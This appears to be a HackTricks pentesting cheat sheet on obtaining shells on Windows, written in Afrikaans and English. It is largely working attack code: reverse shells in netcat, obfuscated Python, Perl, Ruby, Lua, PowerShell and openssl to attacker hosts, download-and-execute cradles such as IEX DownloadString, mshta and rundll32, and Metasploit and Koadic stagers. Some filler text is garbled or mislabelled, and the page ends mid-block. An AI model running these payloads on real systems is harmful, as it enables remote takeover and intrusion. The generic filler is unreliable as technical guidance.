# Skulpe - Windows

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Vind kwesbaarhede wat die belangrikste is sodat jy dit vinniger kan regstel. Intruder volg jou aanvalsoppervlak, voer proaktiewe dreigingsskanderings uit, vind probleme regoor jou hele tegnologie-stapel, van API's tot webtoepassings en wolkstelsels. [**Probeer dit vandag nog gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Lolbas

Die bladsy [lolbas-project.github.io](https://lolbas-project.github.io/) is vir Windows soos [https://gtfobins.github.io/](https://gtfobins.github.io/) is vir Linux.\
Duidelik is daar **nie SUID-lêers of sudo-voorregte in Windows nie**, maar dit is nuttig om te weet **hoe** sommige **binêre lêers** (mis)bruik kan word om sekere onverwagte aksies uit te voer soos **die uitvoer van willekeurige kode**.

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**[sbd](https://www.kali.org/tools/sbd/) is 'n draagbare en veilige Netcat-alternatief**. Dit werk op Unix-agtige stelsels en Win32. Met funksies soos sterk versleuteling, program uitvoering, aanpasbare bronpoorte en voortdurende herverbinding, bied sbd 'n veelsydige oplossing vir TCP/IP kommunikasie. Vir Windows-gebruikers kan die sbd.exe weergawe van die Kali Linux-distribusie gebruik word as 'n betroubare vervanging vir Netcat.
```bash
# Victims machine
sbd -l -p 4444 -e bash -v -n
listening on port 4444


# Atackers
sbd 10.10.10.10 4444
id
uid=0(root) gid=0(root) groups=0(root)
```
## Python

Python is 'n baie gewilde programmeertaal wat algemeen gebruik word in die hacking-gemeenskap. Dit is 'n hoëvlaktaal met 'n eenvoudige sintaksis, wat dit maklik maak om te leer en te gebruik. Python bied 'n wye verskeidenheid biblioteke en modules wat spesifiek ontwerp is vir hacking en pentesting.

### Python-installasie

Om Python op jou rekenaar te installeer, volg die volgende stappe:

1. Gaan na die [Python-webwerf](https://www.python.org/downloads/) en laai die nuutste weergawe van Python af wat beskikbaar is vir jou bedryfstelsel.
2. Voer die aflaai lêer uit en volg die instruksies op die skerm om die installasieproses te voltooi.

### Python-skripsies uitvoer

Om 'n Python-skripsie uit te voer, volg die volgende stappe:

1. Maak 'n nuwe tekslêer en skryf jou Python-kode daarin.
2. Stoor die lêer met 'n `.py` lêeruitbreiding (byvoorbeeld `my_script.py`).
3. Open 'n opdragvenster en navigeer na die plek waar die lêer gestoor is.
4. Voer die volgende opdrag in om die skripsie uit te voer:

```bash
python my_script.py
```

### Python-biblioteke vir hacking

Daar is 'n verskeidenheid Python-biblioteke wat spesifiek ontwerp is vir hacking en pentesting. Hier is 'n paar van die mees gebruikte biblioteke:

- **Scapy**: 'n kragtige en veelsydige biblioteek vir netwerkpakketmanipulasie en -analise.
- **Requests**: 'n eenvoudige en maklik om te gebruik biblioteek vir HTTP-aanvrae en -antwoord.
- **BeautifulSoup**: 'n biblioteek vir die skraping en analise van HTML- en XML-dokumente.
- **Paramiko**: 'n SSH-implementering vir Python wat gebruik kan word vir die outomatiese bestuur van afgeleë bedieners.
- **Pycrypto**: 'n biblioteek vir kriptografie wat verskeie kriptografiese funksies en protokolle bied.

### Python-bronne vir hacking

Daar is 'n paar nuttige bronne wat jou kan help om Python te leer vir hacking en pentesting:

- [Python.org](https://www.python.org/): Die amptelike webwerf van Python bied 'n wye verskeidenheid dokumentasie, tutoriale en voorbeelde.
- [HackerRank](https://www.hackerrank.com/domains/tutorials/10-days-of-statistics): 'n Platform wat programmeeruitdagings bied, insluitend 'n afdeling vir Python.
- [Cybrary](https://www.cybrary.it/): 'n Gratis aanlynplatform wat kursusse en hulpbronne bied vir verskeie IT-veiligheidsonderwerpe, insluitend Python vir pentesting.
- [Stack Overflow](https://stackoverflow.com/): 'n Gemeenskapsgedrewe vraag-en-antwoordwebwerf waar jy vrae kan vra en antwoorde kan vind oor Python en hacking-verwante onderwerpe.

Met Python as 'n kragtige en veelsydige programmeertaal, kan jy dit gebruik om verskeie hacking-take uit te voer, insluitend netwerkmanipulasie, web-skraping, kriptografie en nog baie meer.
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
## Perl

Perl is 'n kragtige en veelsydige skripsietaal wat dikwels gebruik word in die veld van hacking. Dit bied 'n verskeidenheid funksies en modules wat dit 'n nuttige instrument maak vir die uitvoer van verskillende hacking-take.

### Voordele van Perl vir hacking

Hier is 'n paar redes waarom Perl 'n gewilde keuse is vir hackers:

- **Kragtige regulêre uitdrukkings**: Perl het 'n sterk ondersteuning vir regulêre uitdrukkings, wat dit maklik maak om te soek en te manipuleer in teksdata.
- **Ingeboude modules**: Perl het 'n groot verskeidenheid ingeboude modules wat spesifiek ontwerp is vir hacking-take, soos netwerkmanipulasie, databasisinteraksie en kriptografie.
- **Platformonafhanklikheid**: Perl kan op verskillende bedryfstelsels gebruik word, insluitend Windows, Linux en macOS.
- **Groot gemeenskap**: Perl het 'n aktiewe gemeenskap van ontwikkelaars en hackers wat gereeld bydraes lewer en ondersteuning bied.

### Voorbeelde van Perl-hackingtegnieke

Hier is 'n paar voorbeelde van hoe Perl gebruik kan word vir hacking:

- **Webkraak**: Perl kan gebruik word om webkraak-aanvalle uit te voer deur middel van skrips wat HTTP-verbindings maak, webvorme invul en webbladsye analiseer.
- **Netwerkmanipulasie**: Perl kan gebruik word om netwerkverkeer te manipuleer deur middel van sokkets, wat dit moontlik maak om data te onderskep, te verander en te stuur.
- **Databasismanipulasie**: Perl kan gebruik word om databasisse te manipuleer deur middel van modules soos DBI, wat dit moontlik maak om data te onderskep, te verander en te verwyder.
- **Kriptografie**: Perl het 'n verskeidenheid kriptografiese modules wat gebruik kan word vir versleuteling, ontsleuteling en hashfunksies.

### Bronne vir Perl-hacking

Hier is 'n paar nuttige bronne vir die leer en gebruik van Perl vir hacking:

- [Perl.org](https://www.perl.org/): Die amptelike webwerf van Perl, met dokumentasie, tutoriale en voorbeelde.
- [CPAN](https://metacpan.org/): Die Comprehensive Perl Archive Network (CPAN) bied 'n groot verskeidenheid Perl-modules wat gebruik kan word vir hacking-take.
- [PerlMonks](https://www.perlmonks.org/): 'n Gemeenskap van Perl-ontwikkelaars en -gebruikers wat vrae beantwoord en hulp bied.
- [Perl Hacking Tools](https://github.com/hakluke/hakluke/blob/master/perl-hacking-tools.md): 'n Lys van Perl-hackinghulpmiddels wat deur die bekende hacker hakluke saamgestel is.

Met die regte kennis en vaardighede kan Perl 'n kragtige instrument wees vir hackers om verskeie hacking-take uit te voer.
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby is 'n dinamiese, objek-georiënteerde programmeertaal wat algemeen gebruik word vir webontwikkeling en skripskryf. Dit het 'n eenvoudige sintaksis en 'n groot gemeenskap van ontwikkelaars wat dit ondersteun en bydra tot die ontwikkeling van biblioteke en raamwerke.

### Installasie

Om Ruby op 'n Windows-stelsel te installeer, volg die volgende stappe:

1. Gaan na die [Ruby-webwerf](https://www.ruby-lang.org/en/downloads/) en laai die nuutste stabiele weergawe van Ruby af.
2. Voer die aflaai uit en voer die installasieprogram uit.
3. Kies 'n installasieplek en voltooi die installasieproses deur die instruksies op die skerm te volg.

### Uitvoering van Ruby-skrips

Om 'n Ruby-skrips uit te voer, volg die volgende stappe:

1. Maak 'n nuwe tekslêer en skryf jou Ruby-kode daarin.
2. Stoor die lêer met 'n `.rb`-lêeruitbreiding (byvoorbeeld `my_script.rb`).
3. Open 'n opdragvenster en navigeer na die plek waar die lêer gestoor is.
4. Voer die volgende opdrag in om die skrips uit te voer:

```bash
ruby my_script.rb
```

Die uitset van die skrips sal in die opdragvenster vertoon word.

### Belangrike konsepte

Hier is 'n paar belangrike konsepte in Ruby:

- Objekte: Ruby is 'n objek-georiënteerde taal, wat beteken dat dit objekte gebruik om data en funksionaliteit te organiseer.
- Klasses: Klasses is bloudrukke vir die skep van objekte. Hulle definieer die eienskappe en metodes wat 'n objek kan hê.
- Metodes: Metodes is funksies wat aan objekte gekoppel is en gebruik word om spesifieke aksies uit te voer.
- Veranderlikes: Veranderlikes word gebruik om data binne 'n program te stoor en te manipuleer.
- Kontroleverklarings: Kontroleverklarings, soos `if`-verklarings en lusse, word gebruik om die vloei van 'n program te beheer.
- Biblioteke: Ruby het 'n ryk versameling biblioteke en raamwerke wat ontwikkelaars kan gebruik om hul programme uit te brei en te verbeter.

### Bronne

- [Ruby-webwerf](https://www.ruby-lang.org/en/)
- [Ruby-dokumentasie](https://ruby-doc.org/)
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## Lua

Lua is 'n kragtige, vinnige en aanpasbare skripsingstaal wat dikwels gebruik word vir die skryf van skrips vir spelontwikkeling en ander toepassings. Dit bied 'n eenvoudige sintaksis en 'n klein geheue-afdruk, wat dit 'n gewilde keuse maak vir verskeie toepassings.

### Lua Skelms

#### Lua Skelms op Windows

Om 'n Lua-skelm op Windows te gebruik, kan jy die volgende metodes probeer:

1. **Lua Interpreter**: Jy kan die Lua-interpreter gebruik om Lua-skrips uit te voer. Jy kan die interpreter aflaai van die amptelike Lua-webwerf en dit installeer op jou Windows-rekenaar. Daarna kan jy die interpreter gebruik om Lua-skrips uit te voer deur die skrips se pad as 'n argument aan die interpreter te gee.

2. **LuaJIT**: LuaJIT is 'n vinnige implementering van Lua wat 'n JIT-kompilator gebruik om die uitvoeringstyd van Lua-skrips te verbeter. Jy kan LuaJIT aflaai van die amptelike webwerf en dit installeer op jou Windows-rekenaar. Daarna kan jy die `luajit`-opdrag gebruik om Lua-skrips uit te voer.

3. **LuaRocks**: LuaRocks is 'n pakketbestuurder vir Lua-modules en -skrips. Dit maak dit maklik om eksterne modules te installeer en te gebruik in jou Lua-skrips. Jy kan LuaRocks aflaai en installeer van die amptelike webwerf. Daarna kan jy die `lua`-opdrag gebruik om Lua-skrips uit te voer en die `luarocks`-opdrag gebruik om modules te bestuur.

#### Lua Skelms op Linux

Om 'n Lua-skelm op Linux te gebruik, kan jy die volgende metodes probeer:

1. **Lua Interpreter**: Jy kan die Lua-interpreter gebruik om Lua-skrips uit te voer. Die meeste Linux-stelsels het die Lua-interpreter reeds geïnstalleer. Jy kan die interpreter gebruik deur die `lua`-opdrag te gebruik en die skrips se pad as 'n argument te gee.

2. **LuaJIT**: LuaJIT is 'n vinnige implementering van Lua wat 'n JIT-kompilator gebruik om die uitvoeringstyd van Lua-skrips te verbeter. Jy kan LuaJIT installeer deur die toepaslike pakkette te installeer vir jou Linux-stelsel. Daarna kan jy die `luajit`-opdrag gebruik om Lua-skrips uit te voer.

3. **LuaRocks**: LuaRocks is 'n pakketbestuurder vir Lua-modules en -skrips. Dit maak dit maklik om eksterne modules te installeer en te gebruik in jou Lua-skrips. Jy kan LuaRocks installeer deur die toepaslike pakkette te installeer vir jou Linux-stelsel. Daarna kan jy die `lua`-opdrag gebruik om Lua-skrips uit te voer en die `luarocks`-opdrag gebruik om modules te bestuur.
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

Aanvaller (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
# Windows Shell

## Introduction

In the context of hacking, a shell refers to a command-line interface that allows an attacker to interact with a compromised system. In this section, we will explore various methods to obtain a shell on a Windows machine.

## Reverse Shells

A reverse shell is a technique where the attacker sets up a listener on their machine and the compromised system connects back to it. This allows the attacker to execute commands on the compromised system.

### Netcat

Netcat is a versatile networking utility that can be used to create reverse shells. It is available for both Windows and Linux systems.

To create a reverse shell using Netcat, follow these steps:

1. Set up a listener on your machine: `nc -lvp <port>`

2. Execute the following command on the compromised Windows machine: `nc <attacker_ip> <port> -e cmd.exe`

### PowerShell

PowerShell is a powerful scripting language and command-line shell that is built into Windows. It can be used to create reverse shells as well.

To create a reverse shell using PowerShell, follow these steps:

1. Set up a listener on your machine: `nc -lvp <port>`

2. Execute the following command on the compromised Windows machine: `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>', <port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

## Web Shells

Web shells are scripts or programs that are uploaded to a compromised web server to provide remote access and control. They can be used to execute commands, upload/download files, and perform various other actions.

### PHP Web Shell

PHP web shells are commonly used due to the popularity of PHP in web development. They can be easily uploaded to a compromised server and provide a convenient way to interact with the system.

To use a PHP web shell, follow these steps:

1. Upload the PHP web shell to the compromised server.

2. Access the web shell through a web browser by navigating to the location of the uploaded file.

3. Use the provided interface to execute commands and perform actions on the compromised server.

## Conclusion

Obtaining a shell on a Windows machine is a crucial step in the hacking process. Reverse shells and web shells are effective techniques that allow an attacker to gain remote access and control over a compromised system. It is important to use these techniques responsibly and ethically.
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell

Powershell is 'n kragtige skriptingtaal en uitvoeringsomgewing wat spesifiek ontwerp is vir Windows-bedryfstelsels. Dit bied 'n wyse en doeltreffende manier om administratiewe take te outomatiseer en te outomatiseer. Powershell maak gebruik van 'n objekgeoriënteerde benadering en bied 'n ryk stel ingeboude funksies en modules wat dit 'n kragtige hulpmiddel maak vir Windows-gebaseerde hacking en pentesting.

### Powershell-skote

Powershell-skote is 'n manier om kode uit te voer in die Powershell-omgewing. Dit kan gebruik word om verskeie take uit te voer, soos die uitvoer van opdragte, die manipulasie van lêers en mappe, die skep van nuwe prosesse en nog baie meer. Hier is 'n paar nuttige skote wat in Powershell gebruik kan word:

#### Uitvoer van opdragte

```powershell
$uitvoer = Invoke-Expression -Command "opdrag"
```

#### Lêer- en mapmanipulasie

```powershell
# Lys lêers en mappe in 'n gegewe pad
Get-ChildItem -Path "pad"

# Skep 'n nuwe lêer
New-Item -Path "pad\lêernaam" -ItemType File

# Skep 'n nuwe map
New-Item -Path "pad\mapnaam" -ItemType Directory

# Verwyder 'n lêer
Remove-Item -Path "pad\lêernaam"

# Verwyder 'n map en al sy inhoud
Remove-Item -Path "pad\mapnaam" -Recurse
```

#### Prosesbestuur

```powershell
# Kry 'n lys van aktiewe prosesse
Get-Process

# Skep 'n nuwe proses
Start-Process -FilePath "program.exe"

# Beëindig 'n proses
Stop-Process -Name "prosesnaam"
```

### Powershell-skrips

Powershell-skrips is 'n manier om herhaalbare en outomatiseerbare take in Powershell uit te voer. Dit is 'n stel instruksies wat in 'n lêer geplaas word en dan deur die Powershell-omgewing uitgevoer word. Hier is 'n voorbeeld van 'n eenvoudige Powershell-skrips:

```powershell
# Skakel uitvoering van onbekende skrips toe
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force

# Voer 'n opdrag uit
Invoke-Expression -Command "opdrag"

# Skep 'n nuwe lêer
New-Item -Path "pad\lêernaam" -ItemType File
```

Om 'n Powershell-skrips uit te voer, kan jy die volgende opdrag in die Powershell-omgewing gebruik:

```powershell
.\skripsnaam.ps1
```

### Powershell-modules

Powershell-modules is 'n manier om funksionaliteit in Powershell uit te brei deur ekstra funksies en hulpmiddels by te voeg. Dit maak dit moontlik om spesifieke funksies en hulpmiddels te gebruik vir verskillende hacking- en pentesting-take. Hier is 'n paar nuttige Powershell-modules wat gebruik kan word:

- **PowerSploit**: 'n Versameling van kragtige en doeltreffende hacking-hulpmiddels en -tegnieke.
- **Empire**: 'n Volledige post-exploitasie-raamwerk wat gebruik kan word vir die uitvoer van verskeie aanvalle en die verkryging van volledige beheer oor 'n Windows-stelsel.
- **Mimikatz**: 'n Hulpmiddel wat gebruik word om vertroulike inligting, soos wagwoorde en aanmeldingsbesonderhede, uit die geheue van 'n Windows-stelsel te onttrek.
- **Nishang**: 'n Skatkis van nuttige skote en skrips wat gebruik kan word vir verskeie hacking- en pentesting-take.

Om 'n Powershell-module te gebruik, moet jy dit eers invoer deur die volgende opdrag in die Powershell-omgewing te gebruik:

```powershell
Import-Module -Name "modulenaam"
```

Nadat die module ingevoer is, kan jy die funksies en hulpmiddels daarvan gebruik deur die gepaste opdragte uit te voer.
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
Proses wat netwerkoproep uitvoer: **powershell.exe**\
Payload geskryf op skyf: **NEE** (_ten minste nêrens wat ek kon vind deur procmon te gebruik!_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
Proses wat netwerkoproep uitvoer: **svchost.exe**\
Payload geskryf op skyf: **WebDAV-kliënt plaaslike kas**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
**Kry meer inligting oor verskillende Powershell-skulpe aan die einde van hierdie dokument**

## Mshta

* [Vanaf hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```

```bash
mshta http://webserver/payload.hta
```

```bash
mshta \\webdavserver\folder\payload.hta
```
#### **Voorbeeld van hta-psh omgekeerde skul (gebruik hta om PS agterdeur af te laai en uit te voer)**
```xml
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**Jy kan baie maklik 'n Koadic zombie aflaai en uitvoer deur die stager hta te gebruik**

#### hta voorbeeld

[**Vanaf hier**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
```xml
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

[**Van hier af**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**

Mshta is a utility in Windows that allows the execution of HTML applications (HTAs). It can be used as a vector for delivering malicious payloads and executing arbitrary code on a target system. In this section, we will explore how to leverage Mshta using Metasploit.

##### **Mshta Payload Generation**

Metasploit provides a module called `windows/multi/script/web_delivery` that can be used to generate a Mshta payload. This module creates an HTA file that contains the payload and delivers it to the target system.

To use this module, follow these steps:

1. Start Metasploit by running `msfconsole` in the terminal.
2. Search for the `windows/multi/script/web_delivery` module using the `search` command.
3. Select the module using the `use` command followed by the module name.
4. Set the required options such as the payload, LHOST, and LPORT using the `set` command.
5. Generate the Mshta payload using the `exploit` command.

##### **Mshta Payload Execution**

Once the Mshta payload is generated, it needs to be executed on the target system. There are several methods to achieve this, including social engineering techniques and exploiting vulnerabilities.

One common method is to host the HTA file on a web server and trick the target into visiting the URL. When the target accesses the URL, the HTA file is downloaded and executed, resulting in the payload being executed on the target system.

Another method is to deliver the HTA file via email or other communication channels. By enticing the target to open the HTA file, the payload can be executed.

##### **Mshta Payload Detection and Prevention**

Detecting and preventing Mshta payloads can be challenging due to their ability to bypass traditional security measures. However, there are some steps that can be taken to mitigate the risk:

- Regularly update and patch the operating system and applications to prevent known vulnerabilities from being exploited.
- Implement strong email filtering and educate users about the risks of opening suspicious attachments.
- Use network monitoring tools to detect and block suspicious traffic.
- Employ endpoint protection solutions that can detect and block malicious activities.

By following these steps, organizations can reduce the risk of Mshta payloads compromising their systems.
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**Opgespoor deur verdediger**




## **Rundll32**

[**Dll hallo wêreld voorbeeld**](https://github.com/carterjones/hello-world-dll)

* [Van hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```

```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
**Opgespoor deur verdediger**

**Rundll32 - sct**

[**Vanaf hier**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Rundll32 - Metasploit**

Rundll32 is a Windows utility that allows the execution of DLL files. Metasploit is a popular framework used for penetration testing and exploiting vulnerabilities. In this section, we will explore how to use Rundll32 with Metasploit for various hacking purposes.

##### **1. Loading a Meterpreter DLL**

To load a Meterpreter DLL using Rundll32 and Metasploit, follow these steps:

1. Generate a Meterpreter DLL payload using Metasploit.
2. Transfer the generated DLL to the target Windows machine.
3. Open a command prompt on the target machine and navigate to the directory where the DLL is located.
4. Use the following command to execute the DLL:

```
rundll32.exe <DLL_Name>,<Entry_Point>
```

Replace `<DLL_Name>` with the name of the DLL file and `<Entry_Point>` with the entry point function name.

##### **2. Executing Shellcode**

Rundll32 can also be used to execute shellcode on a target machine. To do this, follow these steps:

1. Generate the shellcode using a tool like msfvenom.
2. Convert the shellcode to a DLL using a tool like shellcode2exe.
3. Transfer the generated DLL to the target machine.
4. Open a command prompt on the target machine and navigate to the directory where the DLL is located.
5. Use the following command to execute the DLL:

```
rundll32.exe <DLL_Name>,<Entry_Point>
```

Replace `<DLL_Name>` with the name of the DLL file and `<Entry_Point>` with the entry point function name.

##### **3. Bypassing Application Whitelisting**

Rundll32 can be used to bypass application whitelisting by executing a trusted DLL file. To do this, follow these steps:

1. Identify a trusted DLL file that is allowed by the application whitelisting policy.
2. Rename the malicious DLL to match the name of the trusted DLL.
3. Transfer the malicious DLL to the target machine.
4. Open a command prompt on the target machine and navigate to the directory where the DLL is located.
5. Use the following command to execute the DLL:

```
rundll32.exe <DLL_Name>,<Entry_Point>
```

Replace `<DLL_Name>` with the name of the malicious DLL file and `<Entry_Point>` with the entry point function name.

By leveraging the power of Rundll32 and Metasploit, you can perform various hacking techniques and bypass security measures on Windows machines. However, it is important to note that these techniques should only be used for ethical hacking and with proper authorization.
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**

Rundll32 is a Windows utility that allows the execution of DLL files. Koadic is a post-exploitation tool that uses the Rundll32 utility to load a malicious DLL file and gain control over a compromised system.

To use Koadic, first, you need to generate a malicious DLL file using the Koadic framework. This DLL file contains the payload that will be executed on the target system. Once the DLL file is generated, it can be loaded using the Rundll32 utility.

To load the malicious DLL file, open a command prompt and run the following command:

```
rundll32.exe <path_to_malicious_dll>,<entry_point>
```

Replace `<path_to_malicious_dll>` with the path to the generated DLL file and `<entry_point>` with the entry point function name defined in the DLL file.

Once the DLL file is loaded, the payload will be executed, and you will have control over the compromised system. Koadic provides various post-exploitation modules that can be used to perform actions such as file manipulation, command execution, and privilege escalation.

It is important to note that the use of Rundll32 and Koadic for malicious purposes is illegal and unethical. This information is provided for educational purposes only.
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
